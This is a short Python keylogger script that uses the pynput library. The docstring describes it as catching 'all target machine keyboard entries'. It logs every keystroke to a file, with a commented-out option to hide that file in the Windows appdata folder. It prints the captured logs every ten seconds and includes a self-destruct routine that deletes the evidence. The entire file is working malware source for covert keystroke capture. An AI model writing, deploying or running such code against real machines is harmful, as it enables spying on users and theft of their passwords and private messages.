# -*- Coding : utf-8 -*-

"""
    Catch all target machine keyboard entries.
"""

import os, sys, time, threading
from pynput.keyboard import Listener

class Keylogger():
    keys = []
    count = 0
    #path = os.environ["appdata"] + "\\windows_logger" # For windows machines
    path = "wondows_logger"
    run = 0

    def read_logs(self):
        with open(self.path, "rt") as file:
            return file.read()

    def self_destruct(self):
        self.run = 1
        listener.stop()
        os.remove(self.path)

    def write_file(self, keys):
        with open(self.path, "a") as file:
            for key in keys:
                key = str(key).replace("'", "")

                if key.find('backspace') > 0:
                    file.write(" BACKSPACE ")
                elif key.find('enter') > 0:
                    file.write("\n")
                elif key.find('shift') > 0:
                    file.write(" SHIFT ")
                elif key.find('space') > 0:
                    file.write(" ")
                elif key.find('caps_lock') > 0:
                    file.write(" CAPS_LOCK ")
                elif key.find("Key"):
                    file.write(key)

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def start(self):
        global listener

        print("[*] Key logging...")
        try:
            with Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("[X] Keylogger closed.")
            sys.exit(0)

if __name__ == "__main__":
    keylogger = Keylogger()
    t = threading.Thread(target=keylogger.start)
    t.start()
    while keylogger.run != 1:
        time.sleep(10)
        logs = keylogger.read_logs()
        print(logs)
        #keylogger.self_destruct()
    t.join()
